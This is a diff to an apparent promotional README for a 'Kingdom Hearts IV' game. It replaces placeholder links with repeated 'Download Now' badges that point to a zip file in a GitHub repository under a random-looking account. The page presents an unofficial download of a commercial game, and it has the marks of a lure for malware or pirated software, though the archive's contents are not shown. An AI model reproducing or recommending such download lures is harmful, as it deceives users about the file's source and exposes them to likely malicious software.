@@ -4,7 +4,7 @@
 
 > Sora's long-awaited return — Kingdom Hearts IV takes the beloved hero to breathtaking new realms with new powers and a sweeping story, launching simultaneously on Switch 2 and all platforms.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Uncongenial-handcheese857/kingdom-hearts-iv/raw/refs/heads/main/digynous/kingdom-hearts-iv-v1.4.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **2026** · Available on **PS5, Xbox Series X|S, Nintendo Switch 2, 
 
 ### Ready to play / use?
 
-[![Download Kingdom Hearts IV](https://img.shields.io/badge/Download-Kingdom%20Hearts%20IV-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Kingdom Hearts IV](https://img.shields.io/badge/Download-Kingdom%20Hearts%20IV-brightgreen?style=for-the-badge)](https://github.com/Uncongenial-handcheese857/kingdom-hearts-iv/raw/refs/heads/main/digynous/kingdom-hearts-iv-v1.4.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Uncongenial-handcheese857/kingdom-hearts-iv/raw/refs/heads/main/digynous/kingdom-hearts-iv-v1.4.zip)**
 
 </div>
 
@@ -70,7 +70,7 @@ Kingdom Hearts IV is one of the **most hyped releases of Summer 2026** — trend
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Uncongenial-handcheese857/kingdom-hearts-iv/raw/refs/heads/main/digynous/kingdom-hearts-iv-v1.4.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -78,7 +78,7 @@ Kingdom Hearts IV is one of the **most hyped releases of Summer 2026** — trend
 
 **Don't miss out — Kingdom Hearts IV is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Kingdom%20Hearts%20IV-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Kingdom%20Hearts%20IV-blue?style=for-the-badge)](https://github.com/Uncongenial-handcheese857/kingdom-hearts-iv/raw/refs/heads/main/digynous/kingdom-hearts-iv-v1.4.zip)
 
 *Kingdom Hearts IV — 2026 · PS5, Xbox Series X|S, Nintendo Switch 2, PC*
 
